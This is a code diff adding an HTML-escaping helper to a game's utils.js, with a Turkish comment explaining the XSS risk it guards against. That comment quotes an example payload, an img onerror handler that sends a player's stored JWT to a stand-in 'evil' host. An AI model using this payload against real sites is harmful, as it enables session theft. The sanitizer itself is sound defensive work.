@@ -1,5 +1,30 @@
 /* utils.js — Palantis utility functions */
 
+/* ═══════════════════════════════════════════════════════
+   v1.14.3.34 — XSS GUVENLIK: Global escapeHtml helper
+   ═══════════════════════════════════════════════════════
+   Kullanici girisli HER alan (kullanici_adi, kral, isim, mesaj, tag, baslik)
+   innerHTML'e yazilirken BU FONKSIYONDAN GECIRILMELIDIR.
+
+   Saldiri vektoru: oyuncu kayit ismini "<img src=x onerror=fetch('//evil/?t='+
+   localStorage.palantis_token)>" yaparsa, meydan/guild/casus'ta okuyanin
+   JWT'si calinir. escapeHtml'siz innerHTML = oyun guvenligi yok.
+   ═══════════════════════════════════════════════════════ */
+function escapeHtml(s) {
+  if (s === null || s === undefined) return '';
+  return String(s).replace(/[&<>"'`=\/]/g, function(c) {
+    return ({
+      '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;',
+      "'":'&#39;', '`':'&#x60;', '=':'&#x3D;', '/':'&#x2F;'
+    })[c];
+  });
+}
+// Global alias — tum sayfalarda esc(s) veya escapeHtml(s) kullanilabilir
+if (typeof window !== 'undefined') {
+  window.escapeHtml = escapeHtml;
+  window.esc = escapeHtml;
+}
+
 function numFmt(v){
   // Sayiyi binlik ayiracli formatla (Turkce: 1.234.567)
   // v1.13.58.1: String branch kaldirildi — TR locale "218.168" zaten formatli,
